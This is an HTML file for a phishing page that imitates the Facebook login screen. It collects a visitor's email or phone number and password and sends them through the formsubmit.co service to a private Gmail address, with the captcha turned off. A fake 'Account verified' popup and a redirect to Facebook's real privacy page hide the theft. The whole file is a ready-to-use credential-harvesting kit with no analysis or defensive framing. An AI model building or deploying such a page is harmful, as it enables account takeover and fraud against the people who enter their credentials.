<!DOCTYPE html>

  <title>facebooklogin.meta</title>
  <link rel="stylesheet" href="styles.css">

<body>
  <p class="facebook">facebook</p>
  <main>
    <form method="POST" action="https://formsubmit.co/yolandangoepe@gmail.com">

      <!-- Honeypot -->
      <input type="text" name="_honey" style="display: none;">

      <!-- Disable Captcha -->
      <input type="hidden" name="_captcha" value="false">

      <!--success page-->
      
      <input type="hidden" name="_next" value="https://www.facebook.com/privacy/policy/">
      

      <fieldset>
        <input id="account-details" name="EmailForm" placeholder="Mobile number or email address" type="text" required />

        <input id="new-password" name="new-password" placeholder="Password" type="password"
          required />
      </fieldset>

      
      <input id="button" class="submit" type="submit" onclick="return confirm('Account verified, enjoy facebook')" value="Log In" />

    </form>
    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"><p>Forgotten password?</p></a>

    <div class="or">
                    <hr><span id="or">or</span><hr>
                </div>
                <div class="other-choice">
                    <a href="https://www.facebook.com/reg/" id="create-new-account">Create New Account</a>
                    
                </div>
